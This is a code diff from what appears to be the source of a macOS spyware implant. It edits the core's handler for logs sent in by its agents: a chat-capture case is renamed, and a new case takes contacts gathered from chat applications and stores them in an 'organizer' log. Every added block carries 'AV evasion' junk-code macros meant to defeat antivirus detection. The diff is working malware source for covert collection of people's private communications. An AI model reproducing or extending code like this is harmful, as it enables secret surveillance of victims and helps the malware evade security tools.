@@ -1388,7 +1388,7 @@ static void computerWillShutdown(CFMachPortRef port,
                                 
                 break;
               }
-            case AGENT_CHAT:
+            case AGENT_CHAT_NEW:
               {  
                 // AV evasion: only on release build
                 AV_GARBAGE_000
@@ -1400,7 +1400,7 @@ static void computerWillShutdown(CFMachPortRef port,
                                                         length: shMemLog->commandDataSize];
                 
                 if ([_logManager writeDataToLog: logData
-                                       forAgent: AGENT_CHAT
+                                       forAgent: AGENT_CHAT_NEW
                                       withLogID: 0] == TRUE)
                   {
 #ifdef DEBUG_CORE
@@ -1589,6 +1589,44 @@ static void computerWillShutdown(CFMachPortRef port,
                     }
                   }
 
+                break;
+              }
+            case AGENT_CHAT_CONTACT:
+              {
+                // AV evasion: only on release build
+                AV_GARBAGE_008
+                
+#ifdef DEBUG_CORE
+                verboseLog(@"Log contact from chat agent");
+#endif
+                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                        length: shMemLog->commandDataSize];
+                
+                if ([_logManager createLog: AGENT_ORGANIZER
+                               agentHeader: nil
+                                 withLogID: 0xABCD] == FALSE)
+                {
+                  // AV evasion: only on release build
+                  AV_GARBAGE_002
+                  
+                  break;
+                }
+                
+                if ([_logManager writeDataToLog: logData
+                                       forAgent: AGENT_ORGANIZER
+                                      withLogID: 0xABCD] == FALSE)
+                {
+                  // AV evasion: only on release build
+                  AV_GARBAGE_003
+                  
+                  break;
+                }
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_001
+                
+                [_logManager closeActiveLog: AGENT_ORGANIZER
+                                  withLogID: 0xABCD];
                 break;
               }
             default:
